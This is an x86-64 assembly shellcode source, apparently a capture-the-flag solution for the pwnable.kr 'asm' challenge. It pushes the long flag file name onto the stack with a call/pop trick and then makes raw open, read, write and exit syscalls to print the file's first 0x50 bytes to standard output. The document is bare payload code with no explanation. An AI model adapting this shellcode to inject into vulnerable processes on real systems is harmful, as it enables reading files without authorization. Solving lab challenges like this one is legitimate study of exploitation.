BITS 64
global _start

section .text
_start:
	call open
	db "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong", 0

open:
	pop	rdi
	xor	rsi, rsi
	xor	rdx, rdx
	mov	rax, 0x02
	syscall

	mov	rdi, rax
	mov	rdx, 0x50
	sub	rsp, rdx
	mov	rsi, rsp
	xor	rax, rax
	syscall

	mov	rdi, 0x01
	mov	rsi, rsp
	mov	rdx, 0x50
	mov	rax, 0x01
	syscall

	mov	rax, 0x3c
	syscall
